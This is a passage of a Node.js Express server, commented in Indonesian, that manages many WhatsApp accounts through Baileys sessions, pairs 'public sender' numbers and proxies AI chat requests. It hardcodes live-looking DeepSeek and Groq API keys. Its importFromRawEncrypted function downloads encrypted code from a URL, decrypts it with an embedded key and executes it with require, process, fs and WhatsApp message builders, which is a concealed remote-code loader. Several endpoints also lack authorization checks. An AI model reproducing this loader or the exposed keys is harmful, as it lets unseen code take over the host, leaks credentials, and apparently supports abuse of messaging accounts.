          role: userData?.role || "member"
        };
      });

    res.json({
      success: true,
      users: usernames,
      total: usernames.length
    });
  } catch (err) {
    console.error("Error fetching users:", err);
    res.status(500).json({
      success: false,
      message: "Failed to fetch users"
    });
  }
});

// GET /api/chat/history/:username - Ambil history chat dengan user tertentu
app.get("/api/chat/history/:username", (req, res) => {
  const { key } = req.query;
  const { username } = req.params;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({ success: false, message: "User not found" });
  }

  try {
    const messages = chatList
      .filter(m => 
        (m.from === user.username && m.to === username) ||
        (m.from === username && m.to === user.username)
      )
      .map(m => ({
        id: m.id || `${m.from}-${m.to}-${m.time}`,
        from: m.from,
        to: m.to,
        message: m.message,
        timestamp: m.time,
        fromMe: m.from === user.username
      }));

    res.json({
      success: true,
      messages: messages,
      with_user: username,
      total: messages.length
    });
  } catch (err) {
    console.error("Error fetching history:", err);
    res.status(500).json({
      success: false,
      message: "Failed to fetch chat history"
    });
  }
});

// ===== AI CHAT ENDPOINT =====
app.post("/api/chat", async (req, res) => {
  const { key, messages } = req.body;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ success: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({ success: false, message: "User not found" });
  }

  try {
    const response = await axios.post(
      'https://api.deepseek.com/chat/completions',
      {
        model: 'deepseek-chat',
        messages: messages,
        temperature: 0.7,
        max_tokens: 2000,
        stream: false,
      },
      {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': 'Bearer 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',
        },
        timeout: 30000,
      }
    );

    const aiResponse = response.data.choices[0].message.content;

    return res.json({
      success: true,
      response: aiResponse,
    });
  } catch (error) {
    console.error("AI Chat Error:", error.message);
    return res.json({
      success: false,
      message: "AI service error. Please try again.",
    });
  }
});

// ========== PUBLIC SENDER ENDPOINTS ==========

// 📌 Data structure untuk public senders (disimpan di file JSON)
const PUBLIC_SENDERS_FILE = path.join(__dirname, 'publicSenders.json');

// Load public senders dari file
function loadPublicSenders() {
  try {
    if (fs.existsSync(PUBLIC_SENDERS_FILE)) {
      return JSON.parse(fs.readFileSync(PUBLIC_SENDERS_FILE, 'utf8'));
    }
  } catch (err) {
    console.error("❌ Error loading public senders:", err.message);
  }
  return [];
}

// Save public senders ke file
function savePublicSenders(senders) {
  try {
    fs.writeFileSync(PUBLIC_SENDERS_FILE, JSON.stringify(senders, null, 2));
    console.log("✅ Public senders saved");
  } catch (err) {
    console.error("❌ Error saving public senders:", err.message);
  }
}

// ✅ GET PUBLIC SENDERS - Semua user bisa lihat list public senders
app.get("/getPublicSenders", async (req, res) => {
  try {
    const { key } = req.query;

    if (!key) {
      return res.json({
        valid: false,
        message: "Session key required"
      });
    }

    // Validasi session key
    const user = sikmanuk.find(e => e.sessionKey === key);
    
    if (!user) {
      return res.json({
        valid: false,
        message: "Invalid session key"
      });
    }

    // Load public senders
    const publicSenders = loadPublicSenders();
    
    // Get status dari aktif connections
    const sendersWithStatus = publicSenders.map(sender => {
      const sessionName = sender.sessionName;
      const isActive = biz[sessionName]?.isConnected || mess[sessionName]?.isConnected || false;
      
      return {
        sessionName,
        type: sender.type || "Unknown",
        isActive,
        addedBy: sender.addedBy,
        addedAt: sender.addedAt
      };
    });

    console.log(`📋 [${user.username}] Fetched ${sendersWithStatus.length} public senders`);

    return res.json({
      valid: true,
      senders: sendersWithStatus,
      count: sendersWithStatus.length
    });

  } catch (error) {
    console.error("❌ Error in /getPublicSenders:", error);
    return res.json({
      valid: false,
      message: "Internal server error"
    });
  }
});

// ✅ ADD PUBLIC SENDER - Semua role bisa add (Member, Reseller, mods, Owner)
app.get("/addPublicSender", async (req, res) => {
  try {
    const { key, number } = req.query;

    if (!key || !number) {
      return res.json({
        valid: false,
        message: "Session key and phone number required"
      });
    }

    // Validasi session key
    const user = sikmanuk.find(e => e.sessionKey === key);
    
    if (!user) {
      return res.json({
        valid: false,
        message: "Invalid session key"
      });
    }

    // ✅ Semua role bisa add public sender (tidak ada pengecekan role)

    // Validasi format nomor
    const cleanNumber = number.replace(/[^0-9]/g, '');
    if (cleanNumber.length < 10 || cleanNumber.length > 15) {
      return res.json({
        valid: false,
        message: "Invalid phone number format"
      });
    }

    // Generate session name untuk public sender
    const sessionName = `public_${cleanNumber}`;
    
    // Cek apakah sudah ada
    const publicSenders = loadPublicSenders();
    const exists = publicSenders.find(s => s.sessionName === sessionName);
    
    if (exists) {
      return res.json({
        valid: false,
        message: "This number is already added as public sender"
      });
    }

    // Generate pairing code
    const pairingCode = await generatePairingCode(cleanNumber, sessionName);
    
    if (!pairingCode) {
      return res.json({
        valid: false,
        message: "Failed to generate pairing code"
      });
    }

    // Simpan ke public senders list
    publicSenders.push({
      sessionName,
      phoneNumber: cleanNumber,
      type: "Unknown", // Akan diupdate setelah koneksi
      addedBy: user.username,
      addedByRole: user.role || "Unknown",
      addedAt: new Date().toISOString()
    });
    
    savePublicSenders(publicSenders);

    console.log(`➕ [${user.username}] (${user.role}) Added public sender: ${sessionName}`);

    // Kirim notifikasi ke Telegram
    sendToGroups(
      `🟢 *Public Sender Added*\n\n` +
      `📱 Number: ${cleanNumber}\n` +
      `👤 Added by: ${user.username}\n` +
      `🎭 Role: ${user.role || 'Unknown'}\n` +
      `🔑 Session: ${sessionName}\n` +
      `⏰ Time: ${new Date().toLocaleString('id-ID')}`,
      { parse_mode: "Markdown" }
    );

    return res.json({
      valid: true,
      message: "Public sender added successfully",
      pairingCode,
      sessionName,
      phoneNumber: cleanNumber
    });

  } catch (error) {
    console.error("❌ Error in /addPublicSender:", error);
    return res.json({
      valid: false,
      message: "Internal server error: " + error.message
    });
  }
});

// ✅ DELETE PUBLIC SENDER - Semua role bisa delete (Member, Reseller, mods, Owner)
app.get("/deletePublicSender", async (req, res) => {
  try {
    const { key, sessionName } = req.query;

    if (!key || !sessionName) {
      return res.json({
        valid: false,
        message: "Session key and session name required"
      });
    }

    // Validasi session key
    const user = sikmanuk.find(e => e.sessionKey === key);
    
    if (!user) {
      return res.json({
        valid: false,
        message: "Invalid session key"
      });
    }

    // ✅ Semua role bisa delete public sender (tidak ada pengecekan role)

    // Load public senders
    let publicSenders = loadPublicSenders();
    const senderIndex = publicSenders.findIndex(s => s.sessionName === sessionName);
    
    if (senderIndex === -1) {
      return res.json({
        valid: false,
        message: "Public sender not found"
      });
    }

    const deletedSender = publicSenders[senderIndex];

    // Hapus dari list
    publicSenders = publicSenders.filter(s => s.sessionName !== sessionName);
    savePublicSenders(publicSenders);

    // Disconnect dan hapus session
    try {
      // Disconnect dari WhatsApp jika sedang aktif
      if (biz[sessionName]?.vinzzoffc) {
        await biz[sessionName].vinzzoffc.logout();
        delete biz[sessionName];
      }
      if (mess[sessionName]?.vinzzoffc) {
        await mess[sessionName].vinzzoffc.logout();
        delete mess[sessionName];
      }

      // Hapus folder session
      const sessionPath = path.join(__dirname, 'auth_info', sessionName);
      if (fs.existsSync(sessionPath)) {
        fs.rmSync(sessionPath, { recursive: true, force: true });
        console.log(`🗑️ Deleted session folder: ${sessionPath}`);
      }
    } catch (err) {
      console.error("⚠️ Error cleaning up session:", err.message);
    }

    console.log(`🗑️ [${user.username}] (${user.role}) Deleted public sender: ${sessionName}`);

    // Kirim notifikasi ke Telegram
    sendToGroups(
      `🔴 *Public Sender Deleted*\n\n` +
      `📱 Number: ${deletedSender.phoneNumber}\n` +
      `👤 Deleted by: ${user.username}\n` +
      `🎭 Role: ${user.role || 'Unknown'}\n` +
      `🔑 Session: ${sessionName}\n` +
      `⏰ Time: ${new Date().toLocaleString('id-ID')}`,
      { parse_mode: "Markdown" }
    );

    return res.json({
      valid: true,
      message: "Public sender deleted successfully",
      sessionName
    });

  } catch (error) {
    console.error("❌ Error in /deletePublicSender:", error);
    return res.json({
      valid: false,
      message: "Internal server error: " + error.message
    });
  }
});

// ✅ Helper function untuk generate pairing code untuk public sender
async function generatePairingCode(number, sessionName) {
  try {
    const sessionPath = path.join(__dirname, 'auth_info', sessionName);
    
    // Buat folder jika belum ada
    if (!fs.existsSync(sessionPath)) {
      fs.mkdirSync(sessionPath, { recursive: true });
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const vinzzoffc = makeWASocket({
      version,
      logger: P({ level: "silent" }),
      printQRInTerminal: false,
      auth: state,
      browser: ['Ubuntu', 'Chrome', '20.0.04']
    });

    // Event handler untuk pairing code
    return new Promise((resolve, reject) => {
      let pairingCode = null;
      const timeout = setTimeout(() => {
        vinzzoffc.end();
        reject(new Error("Timeout generating pairing code"));
      }, 30000); // 30 detik timeout

      vinzzoffc.ev.on("creds.update", saveCreds);

      vinzzoffc.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === "open") {
          clearTimeout(timeout);
          
          // Ambil info device type (Business atau Messenger)
          const deviceType = vinzzoffc.user?.id?.includes(':0@') ? "Messenger" : "Business";
          
          // Update type di public senders
          const publicSenders = loadPublicSenders();
          const senderIndex = publicSenders.findIndex(s => s.sessionName === sessionName);
          if (senderIndex !== -1) {
            publicSenders[senderIndex].type = deviceType;
            savePublicSenders(publicSenders);
          }

          console.log(`✅ Public sender ${sessionName} connected as ${deviceType}`);
          
          // Simpan ke aktif connections
          if (deviceType === "Business") {
            biz[sessionName] = { vinzzoffc, isConnected: true };
          } else {
            mess[sessionName] = { vinzzoffc, isConnected: true };
          }

          resolve(pairingCode);
        }

        if (connection === "close") {
          const reason = lastDisconnect?.error?.output?.statusCode;
          
          if (reason === DisconnectReason.loggedOut) {
            console.log(`❌ Public sender ${sessionName} logged out`);
            
            // Hapus dari public senders jika logout
            let publicSenders = loadPublicSenders();
            publicSenders = publicSenders.filter(s => s.sessionName !== sessionName);
            savePublicSenders(publicSenders);
            
            // Hapus folder session
            if (fs.existsSync(sessionPath)) {
              fs.rmSync(sessionPath, { recursive: true, force: true });
            }
          }
        }
      });

      // Request pairing code
      if (!vinzzoffc.authState.creds.registered) {
        setTimeout(async () => {
          try {
            pairingCode = await vinzzoffc.requestPairingCode(number);
            console.log(`🔐 Pairing code for ${sessionName}: ${pairingCode}`);
          } catch (err) {
            clearTimeout(timeout);
            vinzzoffc.end();
            reject(err);
          }
        }, 3000);
      }
    });

  } catch (error) {
    console.error("❌ Error generating pairing code:", error);
    return null;
  }
}

// ✅ Function untuk start semua public senders saat server restart
async function startPublicSenders() {
  try {
    const publicSenders = loadPublicSenders();
    
    if (publicSenders.length === 0) {
      console.log("ℹ️ No public senders to start");
      return;
    }

    console.log(`🚀 Starting ${publicSenders.length} public senders...`);

    for (const sender of publicSenders) {
      const { sessionName } = sender;
      const sessionPath = path.join(__dirname, 'auth_info', sessionName);

      // Skip jika folder tidak ada
      if (!fs.existsSync(sessionPath)) {
        console.log(`⚠️ Session folder not found for ${sessionName}, skipping`);
        continue;
      }

      try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
        const { version } = await fetchLatestBaileysVersion();

        const vinzzoffc = makeWASocket({
          version,
          logger: P({ level: "silent" }),
          printQRInTerminal: false,
          auth: state,
          browser: ['Ubuntu', 'Chrome', '20.0.04']
        });

        vinzzoffc.ev.on("creds.update", saveCreds);

        vinzzoffc.ev.on("connection.update", async (update) => {
          const { connection, lastDisconnect } = update;

          if (connection === "open") {
            const deviceType = vinzzoffc.user?.id?.includes(':0@') ? "Messenger" : "Business";
            
            // Update type di public senders
            const publicSenders = loadPublicSenders();
            const senderIndex = publicSenders.findIndex(s => s.sessionName === sessionName);
            if (senderIndex !== -1) {
              publicSenders[senderIndex].type = deviceType;
              savePublicSenders(publicSenders);
            }

            console.log(`✅ Public sender ${sessionName} connected as ${deviceType}`);
            
            // Simpan ke aktif connections
            if (deviceType === "Business") {
              biz[sessionName] = { vinzzoffc, isConnected: true };
            } else {
              mess[sessionName] = { vinzzoffc, isConnected: true };
            }
          }

          if (connection === "close") {
            const reason = lastDisconnect?.error?.output?.statusCode;
            
            if (reason === DisconnectReason.loggedOut) {
              console.log(`❌ Public sender ${sessionName} logged out, removing...`);
              
              // Hapus dari public senders
              let publicSenders = loadPublicSenders();
              publicSenders = publicSenders.filter(s => s.sessionName !== sessionName);
              savePublicSenders(publicSenders);
              
              // Hapus folder session
              if (fs.existsSync(sessionPath)) {
                fs.rmSync(sessionPath, { recursive: true, force: true });
              }

              // Hapus dari connections
              delete biz[sessionName];
              delete mess[sessionName];
            } else {
              console.log(`⚠️ Public sender ${sessionName} disconnected, retrying...`);
              
              // Auto reconnect setelah 5 detik
              setTimeout(() => {
                startPublicSender(sessionName);
              }, 5000);
            }
          }
        });

      } catch (err) {
        console.error(`❌ Error starting public sender ${sessionName}:`, err.message);
      }

      // Delay antar koneksi
      await sleep(3000);
    }

  } catch (error) {
    console.error("❌ Error in startPublicSenders:", error);
  }
}

// Helper function untuk start satu public sender
async function startPublicSender(sessionName) {
  const sessionPath = path.join(__dirname, 'auth_info', sessionName);

  if (!fs.existsSync(sessionPath)) {
    console.log(`⚠️ Session folder not found for ${sessionName}`);
    return;
  }

  try {
    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const vinzzoffc = makeWASocket({
      version,
      logger: P({ level: "silent" }),
      printQRInTerminal: false,
      auth: state,
      browser: ['Ubuntu', 'Chrome', '20.0.04']
    });

    vinzzoffc.ev.on("creds.update", saveCreds);

    vinzzoffc.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "open") {
        const deviceType = vinzzoffc.user?.id?.includes(':0@') ? "Messenger" : "Business";
        
        console.log(`✅ Public sender ${sessionName} reconnected as ${deviceType}`);
        
        if (deviceType === "Business") {
          biz[sessionName] = { vinzzoffc, isConnected: true };
        } else {
          mess[sessionName] = { vinzzoffc, isConnected: true };
        }
      }

      if (connection === "close") {
        const reason = lastDisconnect?.error?.output?.statusCode;
        
        if (reason !== DisconnectReason.loggedOut) {
          console.log(`⚠️ Public sender ${sessionName} disconnected, retrying...`);
          setTimeout(() => startPublicSender(sessionName), 5000);
        }
      }
    });

  } catch (err) {
    console.error(`❌ Error reconnecting public sender ${sessionName}:`, err.message);
  }
}

// ✅ GRATIS - Groq API (sangat cepat!)
const GROQ_API_URL = 'https://api.groq.com/openai/v1/chat/completions';
const GROQ_API_KEY = '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'; // Daftar di console.groq.com

app.get('/', (req, res) => {
  res.json({
    status: 'online',
    message: 'AI Chat API is running (Groq)',
  });
});

app.post('/api/chat', async (req, res) => {
  try {
    const { key, messages, message } = req.body;

    if (!key) {
      return res.status(400).json({
        success: false,
        message: 'Session key is required',
      });
    }

    let conversation = userSessions.get(key) || [];
    let chatMessages = messages || conversation;
    
    if (message && typeof message === 'string') {
      chatMessages.push({
        role: 'user',
        content: message,
      });
    }

    if (chatMessages.length === 0 || chatMessages[0].role !== 'system') {
      chatMessages.unshift({
        role: 'system',
        content: 'You are a helpful AI assistant.',
      });
    }

    const formattedMessages = chatMessages.map(msg => ({
      role: msg.role,
      content: msg.content,
    }));

    const response = await axios.post(
      GROQ_API_URL,
      {
        model: 'llama-3.3-70b-versatile', // Model gratis & cepat
        messages: formattedMessages,
        temperature: 0.7,
        max_tokens: 1024,
      },
      {
        headers: {
          'Authorization': `Bearer ${GROQ_API_KEY}`,
          'Content-Type': 'application/json',
        },
        timeout: 60000,
      }
    );

    const aiResponse = response.data.choices[0].message.content;

    chatMessages.push({
      role: 'assistant',
      content: aiResponse,
    });

    userSessions.set(key, chatMessages);

    res.json({
      success: true,
      response: aiResponse,
      message_count: chatMessages.length,
    });

  } catch (error) {
    console.error('❌ Error:', error.response?.data || error.message);
    
    res.status(500).json({
      success: false,
      message: 'Failed to get AI response',
      error: error.message,
    });
  }
});

// ===== GET /getLog =====
app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync("logUser.txt", "utf8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const parts = data.trim().split('.');
    if (parts.length !== 2) {
      throw new Error("Invalid encrypted data format");
    }
    
    const [ivB64, encryptedB64] = parts;

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    // Sandbox VM
    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

// ======================================= //
// WhatsApp Connect Logic
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function prepareAuthFolders() {
  const userId = "xs-sessi";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    console.error("Error preparing auth folders:", err.message);
    return [];
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const vinzzoffc = makeWASocket({
        keepAliveIntervalMs: 50000,
        logger: pino({ level: "silent" }),
        auth: state,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        generateHighQualityLinkPreview: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        version
      });

      vinzzoffc.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = vinzzoffc;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = vinzzoffc;
          } else if (type === "Messenger") {
            mess[sessionName] = vinzzoffc;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            if (fs.existsSync(folderPath)) {
              fs.rmSync(folderPath, { recursive: true, force: true });
            }
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            if (fs.existsSync(folderPath)) {
              fs.rmSync(folderPath, { recursive: true, force: true });
            }
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const vinzzoffc = activeConnections[sessionName];
    try {
      vinzzoffc.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "xs-sessi";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
      return false;
  }
  const sessionDir = path.join('xs-sessi', owner, number); 

  if (!fs.existsSync('xs-sessi')) fs.mkdirSync('xs-sessi', { recursive: true });
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

  const vinzzoffc = makeWASocket({
    keepAliveIntervalMs: 50000,
    logger: pino({ level: "silent" }),
    auth: state,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    generateHighQualityLinkPreview: true,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    version
  });

  vinzzoffc.ev.on("creds.update", saveCreds);

  vinzzoffc.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = vinzzoffc;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('xs-sessi', owner, `${number}.json`);

try {
  await waiting(3000)
  if (fs.existsSync(sourceCreds)) {
    const data = fs.readFileSync(sourceCreds); // baca isi file sumber
    fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
    console.log(`✅ Rewrote session to ${destCreds}`);
  }
} catch (e) {
  console.error(`❌ Failed to rewrite creds: ${e.message}`);
}
    }
  });

  return null;
}

async function startUserSessions() {
  try {
    // Ensure base folder exists
    if (!fs.existsSync('xs-sessi')) {
      fs.mkdirSync('xs-sessi', { recursive: true });
    }

    // Create public_senders folder if not exists
    const publicSendersDir = path.join('xs-sessi', 'public_senders');
    if (!fs.existsSync(publicSendersDir)) {
      fs.mkdirSync(publicSendersDir, { recursive: true });
    }

    // Ambil semua subfolder dalam xs-sessi
    const subfolders = fs.readdirSync('xs-sessi')
      .map(name => path.join('xs-sessi', name))
      .filter(p => {
        try {
          return fs.lstatSync(p).isDirectory();
        } catch (err) {
          return false;
        }
      });

    console.log(`[DEBUG] Found ${subfolders.length} subfolders inside xs-sessi`);

    for (const folder of subfolders) {
      try {
        const jsonFiles = fs.readdirSync(folder)
          .filter(file => file.endsWith(".json"))
          .map(file => path.join(folder, file));

        console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

        for (const jsonFile of jsonFiles) {
          const sessionName = path.basename(jsonFile, ".json");

          // ✅ Cek apakah session sudah aktif
          if (activeConnections[sessionName]) {
            console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
            continue;
          }

          try {
            console.log(`[START] Connecting session: ${sessionName}`);
            await connectSession(folder, sessionName);
          } catch (err) {
            console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
          }
        }
      } catch (err) {
        console.error(`Error processing folder ${folder}:`, err.message);
      }
    }
  } catch (err) {
    console.error("Error in startUserSessions:", err.message);
  }
}

// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  try {
    const folderPath = path.join('xs-sessi', subfolderName);
    if (!fs.existsSync(folderPath)) return null;

    const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
    for (const file of jsonFiles) {
      const sessionName = `${path.basename(file, ".json")}`;
      if (activeConnections[sessionName]) {
        return activeConnections[sessionName]; // return socket aktif
      }
    }
    return null; // Tidak ada sesi aktif
  } catch (err) {
    console.error("Error checking active session:", err.message);
    return null;
  }
}

const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}

function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

function loadDB() {
  if (!fs.existsSync("database.json")) fs.writeFileSync("database.json", JSON.stringify([]));
  return JSON.parse(fs.readFileSync("database.json"));
}

function saveDB(data) {
  fs.writeFileSync("database.json", JSON.stringify(data, null, 2));
}

// 🔧 Fungsi utama hapus akun
function doReset(role) {
  const db = loadDB();
  let deleted = [], remain = [];

  if (role === "all") {
    deleted = db.map(u => u.username);
    remain = [];
  } else {
    for (const u of db) {
      if ((u.role || "member") === role) deleted.push(u.username);
      else remain.push(u);
    }
  }

  saveDB(remain);
  fs.writeFileSync("reset_result.txt", deleted.join("\n") || "Tidak ada akun dihapus.");

  return deleted;
}

// === FITUR /STATS - STATUS BOT & USER ===
const startTime = Date.now();

function getUptime() {
  const seconds = Math.floor((Date.now() - startTime) / 1000);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}j ${m}m ${s}d`;
}

const SESSION_PATH = path.join(__dirname, "xs-sessi");

// ===== FUNGSI KIRIM NOTIFIKASI DEVICE CONFLICT =====
async function sendDeviceConflictNotification(username, oldDevice, newDevice, ipAddress) {
  const message = `
🚨 *DEVICE CONFLICT DETECTED!*

👤 *Username:* ${username}
📱 *Old Device:* ${oldDevice.model || 'Unknown'} (${oldDevice.androidId})
🆕 *New Device Trying:* ${newDevice.model || 'Unknown'} (${newDevice.androidId})
📍 *IP Address:* ${ipAddress}
⏰ *Time:* ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}

⚠️ Previous device will be logged out!
  `.trim();

  sendToGroups(message, { parse_mode: "Markdown" });
}

// ===== FUNGSI GET DEVICE INFO =====
async function getDeviceInfo(androidId, deviceName = "Unknown") {
  return {
    androidId,
    model: deviceName,
    loginTime: new Date().toISOString()
  };
}

// ===== Start Express Server =====
app.listen(PORT, () => {
  console.log(`🚀 Server aktif di http://localhost:${PORT}`);
    startUserSessions()
});

// ===== AUTO RESTART PANEL DENGAN STATUS TELEGRAM =====
const RESTART_INTERVAL = 20 * 60 * 1000; // 20 menit

function kirimStatusServer(pesan) {
  try {
